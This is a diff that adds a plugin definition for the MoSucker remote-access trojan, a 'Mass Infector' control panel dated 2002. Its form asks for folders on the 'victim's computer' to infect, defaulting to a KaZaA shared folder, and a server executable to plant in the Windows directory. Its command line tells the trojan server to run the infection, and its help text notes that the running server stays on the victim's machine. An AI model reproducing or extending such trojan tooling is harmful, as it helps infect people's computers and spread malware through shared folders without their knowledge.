@@ -1,0 +1,31 @@
+//Infector plugin by ° Sùpê®chåchí °
+
+name infector 
+
+//Labels:
+label    MyLabel1 10 10 8 ========================================
+label    MyLabel7 10 23 8 ++++++++++++MoSucker+plugin:+MASS+INFECTOR
+label    MyLabel2 10 35 8 ========================================
+
+//Form controls:
+label MyLabel1 10 60 8 Folder+path(s)+to+infect:
+label MyLabel2 10 97 8 Server's+name+in+%windir%:
+textbox text1 10 75 219 8 C:\Program+Files\KaZaA\My+Shared+Folder\
+textbox text2 10 110 219 8 server.exe
+
+button   button2 230 75 20 17 1 ?
+button   button3 230 110 20 17 2 ?
+button   button4 230 140 20 17 3 ?
+button   MyButton4 68 170 180 17 0 Infect+Files
+button   MyButton4 10 170 50 17 4 About
+
+checkbox CheckBox1 10 140 200 15 Delete+server+when+done
+
+// Define the commands starting at 0:
+begin commands
+   send ExecPlugin|infector|@@@{01}<text1>{02}<text2>{03}<CheckBox1?kill> //index=0
+   msgbox This+is+the+path+to+the+directory(s)+on+the+victim's+computer+to+be+infected.+Separate+multiple+filepaths+with+a+"#". //index=2
+   msgbox Upload+a+server+to+the+victim's+windows+directory.+Specify+the+server's+filename+including+extension+here. //index=3
+   msgbox This+will+delete+the+server+you+uploaded+to+the+windows+directory+when+the+infection+is+complete.+This+will+not+remove+your+running+server+from+the+victim.                      
+   msgbox MoSucker+Mass+Infector+plugin+by+°+Sùpê®chåchí+°+16/10/2002
+end commands
